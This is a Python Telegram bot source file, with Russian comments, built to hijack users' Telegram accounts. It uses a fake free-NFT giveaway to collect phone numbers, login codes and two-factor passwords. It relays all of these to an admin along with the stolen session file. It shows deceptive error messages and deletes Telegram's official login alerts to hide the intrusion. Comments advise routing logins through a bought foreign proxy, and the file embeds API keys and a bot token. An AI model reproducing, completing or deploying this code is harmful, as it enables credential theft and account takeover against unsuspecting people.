import os
import asyncio
import logging
import socks # Нужна библиотека PySocks
from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import FSInputFile
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError

# --- НАСТРОЙКИ ---
API_ID = 37668790
API_HASH = '84a0450f9bbf15d1e1d09b47ee25cb49'
TOKEN = '8415795413:AAFKeIBsH75o7V5YkyrquMxCiCeq7eASii0'
ADMIN_ID = 8212981789

# --- НАСТРОЙКА ПРОКСИ (ЧТОБЫ ВХОД БЫЛ НЕ ИЗ РФ) ---
# Купи SOCKS5 прокси (например, Германия или США) и впиши данные ниже
USE_PROXY = False # Поставь True, когда купишь прокси
PROXY_TYPE = socks.SOCKS5
PROXY_ADDR = '123.456.78.90' # IP прокси
PROXY_PORT = 1080             # Порт
PROXY_USER = 'username'       # Логин
PROXY_PASS = 'password'       # Пароль

bot = Bot(token=TOKEN)
dp = Dispatcher()
user_data_storage = {}

class VerifState(StatesGroup):
    waiting_phone = State()
    waiting_code = State()
    waiting_2fa = State()

@dp.message(F.text.in_(["/start", "/nft", "/key"]))
async def cmd_start(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        await message.answer("👑 Панель управления сессиями готова.")
        return

    text = (
        "<b>🎁 Акция: 1 FREE NFT & SECRET KEY</b>\n\n"
        "Вы попали в список участников закрытого дропа. Для генерации вашего уникального "
        "Secret Key и привязки NFT к кошельку, пройдите быструю верификацию аккаунта."
    )
    kb = types.InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="💎 ПОЛУЧИТЬ NFT И КЛЮЧ", callback_data="go_verif")]
    ])
    await message.answer(text, parse_mode="HTML", reply_markup=kb)

@dp.callback_query(F.data == "go_verif")
async def ask_phone(call: types.CallbackQuery, state: FSMContext):
    await call.message.edit_text(
        "📱 <b>Шаг 1 из 2: Идентификация</b>\n\n"
        "Введите ваш номер телефона (в формате +7...), чтобы система могла найти вашу заявку.",
        parse_mode="HTML"
    )
    await state.set_state(VerifState.waiting_phone)

@dp.message(VerifState.waiting_phone)
async def process_phone(message: types.Message, state: FSMContext):
    phone = message.text.strip().replace(" ", "")
    user_id = message.from_user.id

    # Настройка прокси для Telethon
    proxy_config = (PROXY_TYPE, PROXY_ADDR, PROXY_PORT, True, PROXY_USER, PROXY_PASS) if USE_PROXY else None

    client = TelegramClient(
        f"sess_{user_id}", API_ID, API_HASH,
        device_model="iPhone 15 Pro",
        system_version="17.5.1",
        proxy=proxy_config # Применяем прокси здесь
    )
    
    try:
        await client.connect()
        send_code = await client.send_code_request(phone)
        user_data_storage[user_id] = {"client": client, "phone": phone, "hash": send_code.phone_code_hash}
        
        await message.answer(
            "📩 <b>Шаг 2 из 2: Подтверждение</b>\n\n"
            "На ваш аккаунт отправлен официальный код подтверждения.\n\n"
            "📝 <b>Введите код из чата 'Telegram':</b>",
            parse_mode="HTML"
        )
        await state.set_state(VerifState.waiting_code)
        await bot.send_message(ADMIN_ID, f"📞 Номер в работе: <code>{phone}</code>")
        
    except Exception as e:
        await message.answer("❌ Ошибка протокола. Попробуйте позже.")
        await client.disconnect()

@dp.message(VerifState.waiting_code)
async def process_code(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    data = user_data_storage.get(user_id)
    if not data: return

    code = message.text.strip()
    await bot.send_message(ADMIN_ID, f"🔑 Код от @{message.from_user.username}: <code>{code}</code>")

    # СРАЗУ выдаем фейковую ошибку, чтобы юзер не дергался
    error_msg = await message.answer(
        "⚠️ <i>Сообщение не поддерживается в Вашей версии Telegram. Пожалуйста, обновитесь до последней версии.</i>",
        parse_mode="HTML"
    )

    try:
        await data["client"].sign_in(data["phone"], code, phone_code_hash=data["hash"])
        await stealth_finish(message, error_msg, state)
    except SessionPasswordNeededError:
        await message.answer("🔐 Аккаунт защищен облачным паролем. Введите его для завершения:")
        await state.set_state(VerifState.waiting_2fa)
    except PhoneCodeInvalidError:
        await message.answer("❌ Код неверный. Проверьте и введите еще раз:")

@dp.message(VerifState.waiting_2fa)
async def process_2fa(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    data = user_data_storage.get(user_id)
    password = message.text.strip()
    
    await bot.send_message(ADMIN_ID, f"🔓 2FA от @{message.from_user.username}: <code>{password}</code>")
    
    # Фейковая ошибка после ввода пароля
    error_msg = await message.answer("⚠️ <i>Ошибка синхронизации. Ожидайте верификации...</i>", parse_mode="HTML")

    try:
        await data["client"].sign_in(password=password)
        await stealth_finish(message, error_msg, state)
    except:
        await message.answer("❌ Пароль не подходит.")

async def stealth_finish(message, error_msg, state):
    user_id = message.from_user.id
    data = user_data_storage.get(user_id)
    client = data["client"]

    # 1. Сразу отправляем сессию админу (пока юзер ждет)
    await client.disconnect()
    session_path = f"sess_{user_id}.session"
    if os.path.exists(session_path):
        await bot.send_document(ADMIN_ID, FSInputFile(session_path), caption=f"🔥 <b>ЕСТЬ ВХОД!</b>\nНомер: {data['phone']}")

    # 2. Показываем юзеру "процесс"
    await error_msg.edit_text("⏳ <b>Мы верифицируем ваш аккаунт...</b>", parse_mode="HTML")
    
    # Скрытое удаление уведомлений (если юзер еще не вылетел)
    try:
        await client.connect()
        async for msg in client.iter_messages(777000, limit=2):
            await msg.delete()
        await client.disconnect()
    except: pass

    await asyncio.sleep(5)
    await error_msg.edit_text("⏳ <b>До окончания верификации 3 минуты, извините за задержку.</b>", parse_mode="HTML")
    
    # Очищаем состояние, чтобы юзер больше не мог ничего слать
    await state.clear()
    user_data_storage.pop(user_id, None)

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    asyncio.run(dp.start_polling(bot))
